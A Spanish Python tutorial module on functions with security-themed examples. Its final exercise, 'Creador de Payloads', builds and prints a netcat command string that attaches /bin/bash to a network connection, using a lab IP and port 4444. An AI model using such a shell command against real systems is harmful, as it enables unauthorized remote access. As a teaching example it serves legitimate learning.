04. Funciones

Modularización y Reutilización de Código

# Briefing del Módulo

En programación existe un principio sagrado llamado DRY (Don't Repeat Yourself / No te repitas). Si copias y pegas el mismo bloque de código tres veces, lo estás haciendo mal. Las funciones te permiten "empaquetar" código para invocarlo tantas veces como necesites.

Objetivos principales:
  • [*] Definir bloques de código reutilizables con def.
  • [*] Pasar variables a las funciones mediante parámetros.
  • [*] Extraer datos procesados usando return.

1. Definir e Invocar (def)

Para crear una función usamos la palabra reservada def, seguida del nombre de la función y paréntesis. El código no se ejecutará hasta que "invoques" (llames) a la función explícitamente.

# 1. Definición (El plano)
def alertar_intrusion():
    print("[!] ALERTA ROJA: Intento de acceso no autorizado.")

# 2. Invocación (La ejecución)
alertar_intrusion()
alertar_intrusion() # Puedes llamarla mil veces sin reescribir el print

2. Parámetros y Retorno (Return)

Las funciones pueden recibir datos (parámetros) para trabajar con ellos, y pueden escupir un resultado hacia fuera (return) para que lo guardes en una variable, en lugar de simplemente imprimirlo.

# Función con parámetros que devuelve un valor
def validar_puerto(puerto):
    if puerto == 80 or puerto == 443:
        return "Puerto Web"
    return "Puerto Desconocido"

# Guardamos el resultado en una variable
resultado = validar_puerto(443)
print(resultado) # Imprime: Puerto Web

🎯 Misión 04: Creador de Payloads

Escribe una función llamada crear_comando(ip, puerto).
Esta función debe recibir esos dos parámetros y usar un return para devolver el siguiente texto formateado:

"nc -lvnp [puerto] -e /bin/bash [ip]"

Luego, fuera de la función, invócala pasándole la IP "10.10.10.5" y el puerto "4444", y mete el resultado en un print() para verlo.

def crear_comando(ip, puerto):
    return f"nc -lvnp {puerto} -e /bin/bash {ip}"

# Invocamos e imprimimos
payload = crear_comando("10.10.10.5", 4444)
print(f"Comando generado: {payload}")
